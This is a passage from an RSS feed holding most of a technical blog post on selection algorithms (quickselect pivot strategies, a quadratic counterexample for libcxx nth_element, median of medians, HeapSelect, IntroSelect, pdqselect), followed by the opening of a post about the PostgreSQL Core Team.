<p><img src="https://s0.wp.com/latex.php?latex=%5Cdisplaystyle+C%28n%29+%5Cleq+n+-+1+%2B+%5Cfrac%7B1%7D%7Bn%7D%5Csum_%7Bn%2F2%7D%5E%7Bn+-+1%7D+C%28i%29&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="\displaystyle C(n) \leq n - 1 + \frac{1}{n}\sum_{n/2}^{n - 1} C(i)" title="\displaystyle C(n) \leq n - 1 + \frac{1}{n}\sum_{n/2}^{n - 1} C(i)"></p>



<p><img src="https://s0.wp.com/latex.php?latex=%5Cdisplaystyle+C%28n%29+%5Cleq+%28n+-+1%29+%2B+%5Cmathrm%7Bavg%7D%28C%28n%2F2%29%2C+%5Cldots%2C+C%28n%29%29&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="\displaystyle C(n) \leq (n - 1) + \mathrm{avg}(C(n/2), \ldots, C(n))" title="\displaystyle C(n) \leq (n - 1) + \mathrm{avg}(C(n/2), \ldots, C(n))"></p>



<p>If assuming by induction that <img src="https://s0.wp.com/latex.php?latex=C%28i%29+%5Cleq+4i&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="C(i) \leq 4i" title="C(i) \leq 4i"> with an obvious induction base, we get</p>



<p><img src="https://s0.wp.com/latex.php?latex=C%28n%29+%5Cleq+%28n+-+1%29+%2B+%5Cmathrm%7Bavg%7D%28C%28n%2F2%29%2C+%5Cldots%2C+C%28n%29%29+%5Cleq+n+-+1+%2B+4%283n%2F4%29+%3C+4n&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="C(n) \leq (n - 1) + \mathrm{avg}(C(n/2), \ldots, C(n)) \leq n - 1 + 4(3n/4) < 4n" title="C(n) \leq (n - 1) + \mathrm{avg}(C(n/2), \ldots, C(n)) \leq n - 1 + 4(3n/4) < 4n"> </p>



<p>Bad news is that the worst case will still be <img src="https://s0.wp.com/latex.php?latex=O%28n%5E2%29&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="O(n^2)" title="O(n^2)"> if we are unfortunate and always pick the biggest element as a pivot, thus partitioning .</p>



<p>In that sense that algorithm provides lots of pivot “strategies” that are used nowadays, for example, picking pivot as a <img src="https://s0.wp.com/latex.php?latex=n%2F2&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="n/2" title="n/2"> element of the array or picking pivot from 3 random elements . Or do like <code>std::nth_element</code> from libcxx — choose the middle out out of <img src="https://s0.wp.com/latex.php?latex=A%5B0%5D%2C+A%5Bn%2F2%5D%2C+A%5Bn+-+1%5D&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="A[0], A[n/2], A[n - 1]" title="A[0], A[n/2], A[n - 1]">.</p>



<p>I decided to visualize all algorithms I am going to talk about today, so quickselect with a median of 3 strategy on random input looks something like this:</p>



<figure><img data-attachment-id="579" data-permalink="https://danlark.org/nth-element-clang-2020-11-09_11-18-38/" data-orig-file="https://danlarkorg.files.wordpress.com/2020/11/nth-element-clang-2020-11-09_11.18.38.gif" data-orig-size="1720,1034" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="nth-element-clang-2020-11-09_11.18.38" data-image-description="" data-medium-file="https://danlarkorg.files.wordpress.com/2020/11/nth-element-clang-2020-11-09_11.18.38.gif?w=300" data-large-file="https://danlarkorg.files.wordpress.com/2020/11/nth-element-clang-2020-11-09_11.18.38.gif?w=750" src="https://danlarkorg.files.wordpress.com/2020/11/nth-element-clang-2020-11-09_11.18.38.gif?w=1024" alt=""><figcaption>nth_element in libcxx, median of 3 strategies</figcaption></figure>



<p>And random pivot out of 3 elements works similar</p>



<figure><img data-attachment-id="581" data-permalink="https://danlark.org/median-of-3-random-2020-11-09_11-06-02/" data-orig-file="https://danlarkorg.files.wordpress.com/2020/11/median-of-3-random-2020-11-09_11.06.02.gif" data-orig-size="1720,1034" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="median-of-3-random-2020-11-09_11.06.02" data-image-description="" data-medium-file="https://danlarkorg.files.wordpress.com/2020/11/median-of-3-random-2020-11-09_11.06.02.gif?w=300" data-large-file="https://danlarkorg.files.wordpress.com/2020/11/median-of-3-random-2020-11-09_11.06.02.gif?w=750" src="https://danlarkorg.files.wordpress.com/2020/11/median-of-3-random-2020-11-09_11.06.02.gif?w=1024" alt=""><figcaption>Finding median in median of 3 random algorithm</figcaption></figure>



<p>For a strategy like <a href="https://github.com/llvm/llvm-project/blob/3ed89b51da38f081fedb57727076262abb81d149/libcxx/include/algorithm#L5159">libcxx</a> (C++ llvm standard library) does, there are quadratic counterexamples that are pretty easy to detect, such patterns also appear in real data. The counterexample looks like that:</p>



<figure><div>
<div id="gist106376435">
    <div>
      <div>
        

      </div>
      
    </div>
</div>

</div></figure>



<figure><img data-attachment-id="584" data-permalink="https://danlark.org/nth_element_clang_median_3_killer-2020-11-10_22-55-30/" data-orig-file="https://danlarkorg.files.wordpress.com/2020/11/nth_element_clang_median_3_killer-2020-11-10_22.55.30.gif" data-orig-size="1720,1034" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="nth_element_clang_median_3_killer-2020-11-10_22.55.30" data-image-description="" data-medium-file="https://danlarkorg.files.wordpress.com/2020/11/nth_element_clang_median_3_killer-2020-11-10_22.55.30.gif?w=300" data-large-file="https://danlarkorg.files.wordpress.com/2020/11/nth_element_clang_median_3_killer-2020-11-10_22.55.30.gif?w=750" src="https://danlarkorg.files.wordpress.com/2020/11/nth_element_clang_median_3_killer-2020-11-10_22.55.30.gif?w=1024" alt=""><figcaption>std::nth_element in libcxx for Medianof3Killer</figcaption></figure>



<p>This is definitely quadratic. By the way, this is perfectly ok with the C++ standard wording as it says:</p>



<figure><img data-attachment-id="587" data-permalink="https://danlark.org/2020-11-10-230126_795x63_scrot/" data-orig-file="https://danlarkorg.files.wordpress.com/2020/11/2020-11-10-230126_795x63_scrot.png" data-orig-size="795,63" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="2020-11-10-230126_795x63_scrot" data-image-description="" data-medium-file="https://danlarkorg.files.wordpress.com/2020/11/2020-11-10-230126_795x63_scrot.png?w=300" data-large-file="https://danlarkorg.files.wordpress.com/2020/11/2020-11-10-230126_795x63_scrot.png?w=750" src="https://danlarkorg.files.wordpress.com/2020/11/2020-11-10-230126_795x63_scrot.png?w=795" alt="" srcset="https://danlarkorg.files.wordpress.com/2020/11/2020-11-10-230126_795x63_scrot.png 795w, https://danlarkorg.files.wordpress.com/2020/11/2020-11-10-230126_795x63_scrot.png?w=150 150w, https://danlarkorg.files.wordpress.com/2020/11/2020-11-10-230126_795x63_scrot.png?w=300 300w, https://danlarkorg.files.wordpress.com/2020/11/2020-11-10-230126_795x63_scrot.png?w=768 768w" sizes="(max-width: 795px) 100vw, 795px"><figcaption><a href="https://eel.is/c++draft/alg.nth.element#5">https://eel.is/c++draft/alg.nth.element#5</a></figcaption></figure>



<h2>Median of Medians</h2>



<p>For a long time, computer scientists thought that it is impossible to find medians in worst-case linear time, however, Blum, Floyd, Pratt, Rivest, Tarjan came up with BFPRT algorithm or like sometimes it is called, median of medians algorithm.</p>



<p>Median of medians algorithm: Given array <img src="https://s0.wp.com/latex.php?latex=A&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="A" title="A"> of size <img src="https://s0.wp.com/latex.php?latex=n&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="n" title="n"> and integer <img src="https://s0.wp.com/latex.php?latex=k+%5Cleq+n&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="k \leq n" title="k \leq n">,</p>



<ol><li>Group the array into <img src="https://s0.wp.com/latex.php?latex=n%2F5&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="n/5" title="n/5"> groups of size 5 and find the median of each group. (For simplicity, we will ignore integrality issues.)</li><li>Recursively, find the true median of the medians. Call this <img src="https://s0.wp.com/latex.php?latex=p&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="p" title="p">.</li><li>Use <img src="https://s0.wp.com/latex.php?latex=p&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="p" title="p"> as a pivot to partition the array.</li><li>Recurse on the appropriate piece.</li></ol>



<p>When we find the median <img src="https://s0.wp.com/latex.php?latex=p&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="p" title="p"> of <img src="https://s0.wp.com/latex.php?latex=g+%3D+n%2F5&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="g = n/5" title="g = n/5"> groups, at least <img src="https://s0.wp.com/latex.php?latex=g%2F2&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="g/2" title="g/2"> of them have at least 3 out of 5 elements that are smaller or equal than <img src="https://s0.wp.com/latex.php?latex=p&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="p" title="p">, that said the biggest out of 2 partitioned chunks have size <img src="https://s0.wp.com/latex.php?latex=7n%2F10&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="7n/10" title="7n/10"> and we have the reccurence</p>



<p><img src="https://s0.wp.com/latex.php?latex=C%28n%29+%5Cleq+cn+%2B+C%28n%2F5%29+%2B+C%287n%2F10%29&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="C(n) \leq cn + C(n/5) + C(7n/10)" title="C(n) \leq cn + C(n/5) + C(7n/10)"></p>



<p>If we appropriately build the recurse tree we will see that</p>



<figure><img data-attachment-id="589" data-permalink="https://danlark.org/2020-11-10-232345_1330x458_scrot/" data-orig-file="https://danlarkorg.files.wordpress.com/2020/11/2020-11-10-232345_1330x458_scrot.png" data-orig-size="1330,458" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="2020-11-10-232345_1330x458_scrot" data-image-description="" data-medium-file="https://danlarkorg.files.wordpress.com/2020/11/2020-11-10-232345_1330x458_scrot.png?w=300" data-large-file="https://danlarkorg.files.wordpress.com/2020/11/2020-11-10-232345_1330x458_scrot.png?w=750" src="https://danlarkorg.files.wordpress.com/2020/11/2020-11-10-232345_1330x458_scrot.png?w=1024" alt="" srcset="https://danlarkorg.files.wordpress.com/2020/11/2020-11-10-232345_1330x458_scrot.png?w=1024 1024w, https://danlarkorg.files.wordpress.com/2020/11/2020-11-10-232345_1330x458_scrot.png?w=150 150w, https://danlarkorg.files.wordpress.com/2020/11/2020-11-10-232345_1330x458_scrot.png?w=300 300w, https://danlarkorg.files.wordpress.com/2020/11/2020-11-10-232345_1330x458_scrot.png?w=768 768w, https://danlarkorg.files.wordpress.com/2020/11/2020-11-10-232345_1330x458_scrot.png 1330w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>This is the geometric series with <img src="https://s0.wp.com/latex.php?latex=cn%281+%2B+9%2F10+%2B+%289%2F10%29%5E2+%2B+%289%2F10%29%5E3+%2B+%5Cldots+...%29&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="cn(1 + 9/10 + (9/10)^2 + (9/10)^3 + \ldots ...)" title="cn(1 + 9/10 + (9/10)^2 + (9/10)^3 + \ldots ...)"> which gives us the result <img src="https://s0.wp.com/latex.php?latex=C%28n%29+%5Cleq+10+c+n&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="C(n) \leq 10 c n" title="C(n) \leq 10 c n">.</p>



<p>Actually, this constant 10 is really big. For example, if we look a bit closer, <img src="https://s0.wp.com/latex.php?latex=c&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="c" title="c"> is at least 1 because we need to partition the array, then finding median out of 5 elements cannot be done in less than 6 comparisons (can be proven by only brute-forcing) and in 6 comparisons it can be done in the following way</p>



<ol><li>Use three comparisons and shuffle around the numbers so that <img src="https://s0.wp.com/latex.php?latex=a%5B1%5D+%3C+a%5B2%5D%2C+a%5B4%5D+%3C+a%5B5%5D&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="a[1] < a[2], a[4] < a[5]" title="a[1] < a[2], a[4] < a[5]">, and <img src="https://s0.wp.com/latex.php?latex=a%5B1%5D+%3C+a%5B4%5D&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="a[1] < a[4]" title="a[1] < a[4]">.</li><li>If <img src="https://s0.wp.com/latex.php?latex=a%5B3%5D+%3E+a%5B2%5D&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="a[3] > a[2]" title="a[3] > a[2]">, then the problem is fairly easy. If <img src="https://s0.wp.com/latex.php?latex=a%5B2%5D+%3C+a%5B4%5D&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="a[2] < a[4]" title="a[2] < a[4]">, the median value is the smaller of <img src="https://s0.wp.com/latex.php?latex=a%5B3%5D&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="a[3]" title="a[3]"> and <img src="https://s0.wp.com/latex.php?latex=a%5B4%5D&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="a[4]" title="a[4]">. If not, the median value is the smaller of <img src="https://s0.wp.com/latex.php?latex=a%5B2%5D&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="a[2]" title="a[2]"> and <img src="https://s0.wp.com/latex.php?latex=a%5B5%5D&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="a[5]" title="a[5]">.</li><li>So <img src="https://s0.wp.com/latex.php?latex=a%5B3%5D+%3C+a%5B2%5D&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="a[3] < a[2]" title="a[3] < a[2]">. If <img src="https://s0.wp.com/latex.php?latex=a%5B3%5D+%3E+a%5B4%5D&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="a[3] > a[4]" title="a[3] > a[4]">, then the solution is the smaller of <img src="https://s0.wp.com/latex.php?latex=a%5B3%5D&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="a[3]" title="a[3]"> and <img src="https://s0.wp.com/latex.php?latex=a%5B5%5D&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="a[5]" title="a[5]">. Otherwise, the solution is the smaller of <img src="https://s0.wp.com/latex.php?latex=a%5B2%5D&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="a[2]" title="a[2]"> and <img src="https://s0.wp.com/latex.php?latex=a%5B4%5D&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="a[4]" title="a[4]">.</li></ol>



<p>So that maximum <img src="https://s0.wp.com/latex.php?latex=c&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="c" title="c"> can be <img src="https://s0.wp.com/latex.php?latex=11%2F5&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="11/5" title="11/5"> and it gives us the upper bound <img src="https://s0.wp.com/latex.php?latex=22n&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="22n" title="22n"> comparisons which looks like it can be achieved. Some other tricks can be done in place to achieve a bit lower constants like <img src="https://s0.wp.com/latex.php?latex=18n&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="18n" title="18n"> (for example, sorting arrays of 5 and comparing less afterwards). In practice, the constant is really big and you can see it from the following demonstration which was even fastened because it took quite a few seconds:</p>



<figure><img data-attachment-id="593" data-permalink="https://danlark.org/median-of-medians-2020-11-09_11-04-33/" data-orig-file="https://danlarkorg.files.wordpress.com/2020/11/median-of-medians-2020-11-09_11.04.33.gif" data-orig-size="1720,1034" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="median-of-medians-2020-11-09_11.04.33" data-image-description="" data-medium-file="https://danlarkorg.files.wordpress.com/2020/11/median-of-medians-2020-11-09_11.04.33.gif?w=300" data-large-file="https://danlarkorg.files.wordpress.com/2020/11/median-of-medians-2020-11-09_11.04.33.gif?w=750" src="https://danlarkorg.files.wordpress.com/2020/11/median-of-medians-2020-11-09_11.04.33.gif?w=1024" alt=""><figcaption>Median of medians for random input</figcaption></figure>



<h2>HeapSelect</h2>



<p>Another approach to finding <img src="https://s0.wp.com/latex.php?latex=k&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="k" title="k">th element is to create a <a href="https://en.wikipedia.org/wiki/Heap_(data_structure)">heap</a> on an array of size <img src="https://s0.wp.com/latex.php?latex=k&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="k" title="k"> and push other <img src="https://s0.wp.com/latex.php?latex=n+-+k&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="n - k" title="n - k"> elements into this heap. C++ <code>std::partial_sort</code> works that way (with additional heap sorting of the first heap). It shows good results for very small <img src="https://s0.wp.com/latex.php?latex=k&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="k" title="k"> and random/ascending arrays, however starts to significantly degrade with growing <img src="https://s0.wp.com/latex.php?latex=k&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="k" title="k"> and becomes impractical. Best case <img src="https://s0.wp.com/latex.php?latex=O%28n%29&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="O(n)" title="O(n)">, worst <img src="https://s0.wp.com/latex.php?latex=O%28n+%5Clog+k%29&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="O(n \log k)" title="O(n \log k)">, average <img src="https://s0.wp.com/latex.php?latex=O%28n+%5Clog+k%29&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="O(n \log k)" title="O(n \log k)">.</p>



<figure><img data-attachment-id="596" data-permalink="https://danlark.org/partial_sort-2020-11-09_12-28-40/" data-orig-file="https://danlarkorg.files.wordpress.com/2020/11/partial_sort-2020-11-09_12.28.40.gif" data-orig-size="1720,1034" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="partial_sort-2020-11-09_12.28.40" data-image-description="" data-medium-file="https://danlarkorg.files.wordpress.com/2020/11/partial_sort-2020-11-09_12.28.40.gif?w=300" data-large-file="https://danlarkorg.files.wordpress.com/2020/11/partial_sort-2020-11-09_12.28.40.gif?w=750" src="https://danlarkorg.files.wordpress.com/2020/11/partial_sort-2020-11-09_12.28.40.gif?w=1024" alt=""><figcaption>std::partial_sort, two stages, first HeapSelect then heap sort of the first half, accelerated for speed</figcaption></figure>



<h2>IntroSelect</h2>



<p>As the previous algorithm is not very much practical and QuickSelect is really good on average, in 1997 <a href="http://www.cs.rpi.edu/~musser/gp/introsort.ps">“Introspective Sorting and Selection Algorithms”</a>  from David Musser came out with a sorting algorithm called “IntroSelect”. </p>



<p>IntroSelect works by optimistically starting out with QuickSelect and only switching to MedianOfMedians if it recurses too many times without making sufficient progress. Simply limiting the recursion to constant depth is not good enough, since this would make the algorithm switch on all sufficiently large arrays. Musser discusses a couple of simple approaches:</p>







<p>This algorithm came into <a href="https://github.com/gcc-mirror/gcc/blob/e0af865ab9d9d5b6b3ac7fdde26cf9bbf635b6b4/libstdc%2B%2B-v3/include/bits/stl_algo.h#L4748">libstdcxx</a> and guess which strategy was chosen? Correct, none of them. Instead, they try <img src="https://s0.wp.com/latex.php?latex=2%5Clog+n&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="2\log n" title="2\log n"> QuickSelect steps and if not successful, fallback to HeapSelect algorithm. So, worst case <img src="https://s0.wp.com/latex.php?latex=O%28n+%5Clog+n%29&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="O(n \log n)" title="O(n \log n)">, average <img src="https://s0.wp.com/latex.php?latex=O%28n%29&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="O(n)" title="O(n)"></p>



<figure><img data-attachment-id="598" data-permalink="https://danlark.org/nth-element-gcc-2020-11-09_11-06-37/" data-orig-file="https://danlarkorg.files.wordpress.com/2020/11/nth-element-gcc-2020-11-09_11.06.37.gif" data-orig-size="1720,1034" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="nth-element-gcc-2020-11-09_11.06.37" data-image-description="" data-medium-file="https://danlarkorg.files.wordpress.com/2020/11/nth-element-gcc-2020-11-09_11.06.37.gif?w=300" data-large-file="https://danlarkorg.files.wordpress.com/2020/11/nth-element-gcc-2020-11-09_11.06.37.gif?w=750" src="https://danlarkorg.files.wordpress.com/2020/11/nth-element-gcc-2020-11-09_11.06.37.gif?w=1024" alt=""><figcaption>std::nth_element in libstdcxx, “IntroSelect”</figcaption></figure>



<h2>PDQSelect</h2>



<p>Now that most of the known algorithms come to an end 😈, we can start looking into something special and extraordinary. And the first one to look at is pdqselect which comes pretty straightforward from <a href="https://github.com/orlp/pdqsort">pdqsort</a>, the algorithm is basically QuickSelect but with some interesting ideas on how to choose an appropriate pivot:</p>



<ol><li>If there are <img src="https://s0.wp.com/latex.php?latex=n+%3C+24&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="n < 24" title="n < 24"> elements, use <a href="https://en.wikipedia.org/wiki/Insertion_sort">insertion sort</a> to partition or even sort them. As insertion sort is really fast for a small amount of elements, it is reasonable</li><li>If it is more, choose <img src="https://s0.wp.com/latex.php?latex=p&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="p" title="p"> — pivot:<ol><li>If there are less or equal than 128 elements, choose pseudomedian (or “ninther”, or median of medians which are all them same) of the following 3 groups:<ol><li>begin, mid, end</li><li>begin + 1, mid – 1, end – 1</li><li>begin + 2, mid + 1, end – 2</li></ol></li><li>If there are more than 128 elements, choose median of 3 from begin, mid, end</li></ol></li><li>Partition the array by the chosen pivot with avoiding <a href="https://www.researchgate.net/publication/301614727_BlockQuicksort_How_Branch_Mispredictions_don't_affect_Quicksort">branches</a>:<ol><li>The partition is called bad if it splits less than <img src="https://s0.wp.com/latex.php?latex=1%2F8n&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="1/8n" title="1/8n"> elements</li><li>If the total number of bad partitions exceeds <img src="https://s0.wp.com/latex.php?latex=%5Clog+n&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="\log n" title="\log n">, use <code>std::nth_element</code> or any other fallback algorithm and return</li><li>Otherwise, try to defeat some patterns in the partition by (sizes are l_size and r_size respectively):<ol><li>Swapping begin, begin + l_size / 4</li><li>Swapping p – 1 and p – l_size / 4</li><li>And if the number of elements is more than 128<ol><li>begin + 1, begin + l_size / 4 + 1</li><li>begin + 2, begin + l_size / 4 + 2</li><li>p – 2, p – l_size / 4 + 1</li><li>p – 3, p – l_size / 4 + 2</li></ol></li><li>Do the same with the right partition</li></ol></li></ol></li><li>Choose the right partition part and repeat like in QuickSelect</li></ol>



<figure><img data-attachment-id="605" data-permalink="https://danlark.org/pdqselect-2020-11-09_11-03-23/" data-orig-file="https://danlarkorg.files.wordpress.com/2020/11/pdqselect-2020-11-09_11.03.23.gif" data-orig-size="1720,1034" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="pdqselect-2020-11-09_11.03.23" data-image-description="" data-medium-file="https://danlarkorg.files.wordpress.com/2020/11/pdqselect-2020-11-09_11.03.23.gif?w=300" data-large-file="https://danlarkorg.files.wordpress.com/2020/11/pdqselect-2020-11-09_11.03.23.gif?w=750" src="https://danlarkorg.files.wordpress.com/2020/11/pdqselect-2020-11-09_11.03.23.gif?w=1024" alt=""><figcaption>pdqselect on random input</figcaption></figure>



<h2>Media…</h2></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://danlark.org/2020/11/11/miniselect-practical-and-generic-selection-algorithms/">https://danlark.org/2020/11/11/miniselect-practical-and-generic-selection-algorithms/</a></em></p>]]>
            </description>
            <link>https://danlark.org/2020/11/11/miniselect-practical-and-generic-selection-algorithms/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25059942</guid>
            <pubDate>Wed, 11 Nov 2020 16:46:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Is It Time to Modernize the PostgreSQL Core Team?]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25059852">thread link</a>) | @ahachete
<br/>
November 11, 2020 | https://postgresql.fund/blog/is-it-time-to-modernize-postgresql-core/ | <a href="https://web.archive.org/web/*/https://postgresql.fund/blog/is-it-time-to-modernize-postgresql-core/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
    <div>
        <div>
            <div>
                
                <div>
                    
<p>The PostgreSQL Community is large, diverse and global. There are users, enthusiasts, developers, contributors, advocates and commercial entities from around the world. All of them working in a loosely collaborative fashion to grow and make PostgreSQL succeed.</p>
<p>The Postgres Core Team is considered to be the steering committee for the Community. The definition of the group responsibilities can be <a href="https://www.postgresql.org/developer/core/">found here</a>. The core team members are listed on the <a href="https://www.postgresql.org/community/contributors/">Contributor Profiles</a> page.</p>
